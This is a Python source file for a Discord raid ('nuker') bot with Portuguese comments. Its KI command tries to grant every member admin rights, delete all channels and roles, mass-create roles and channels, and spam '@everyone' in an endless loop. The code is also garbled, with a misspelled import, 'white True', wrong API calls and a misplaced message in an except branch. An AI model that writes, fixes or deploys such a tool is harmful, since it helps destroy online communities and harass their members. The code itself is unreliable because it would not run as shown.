import discord
import os
import colorama
from dsicord.ext import commands
from colorama import Fore, Back, Style, init
init()

token = '' # coloque o token do seu BOT
Prefixo = '' # coloque o prefixo para seu BOT
Intents = discord.Intents.all()

bot = commands.Bot(command_prefix=Prefixo, intents=Intents)
bot.remove_command('help')

#  Nome dos Canais, Cargos!
Cargos = '' #  Nome dos cargos
Canais = '' #  Nome dos canais

#  Mensagens que serão SPAM nos canais
Mensagens = f'@everyone '  # Digitem e caso queira uma quebra de linha digite {os.linsep}

@bot.event
async def on_ready():
  print(f'Estou on como {bot.user.name}')
  print(bot.user)
  
@bot.event
async def on_guild_channel_create(channel):
  white True:
    await channel.send(random.choice(Mensagens))
 
  # Comando para apagar canais, cargos e criar canais, cargos e mandar mensagem
@bot.command(aliases=['Ki']+['ki'])
async def KI(ctx):
  await ctx.send('**Triste fim...**')
  guild = ctx.guild
  try:
      role = discord.utils.get(guild.roles, name = '@veryone')
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "Eu dei admin a todos" + Fore.RESET)
  except:
      print(Fore.GREEN + "Eu não consegui dar admin a todos ;-;" + Fore.RESET)
  for channel in list(ctx.guild.channels):
    try:
      await channel.delete()
     except:
      print(Fore.GREEN + f"O canal {channel.name} foi apagado!!" + Fore.RESET)
  for role in guild.roles:
    try:
      await role.delete()
      print(Fore.MAGENTA  + f"{role.name} foi deletado!!" + Fore.RESET)
    except:
      print(Fore.GREEN  + f"{role.name} não foi deletado!!" + Fore.RESET)
  amount = 50
  for _i in range(amount):
      await ctx.guild.create.roles(name=Cargos)
  amount = 500
  for _i in range(amount):
      await ctx.guild.create.channels(name=Canais)
      print(Fore.GREEN + "Cnais criados com o nome de" + Canais + Fore.RESET)
  
bot.run(token)
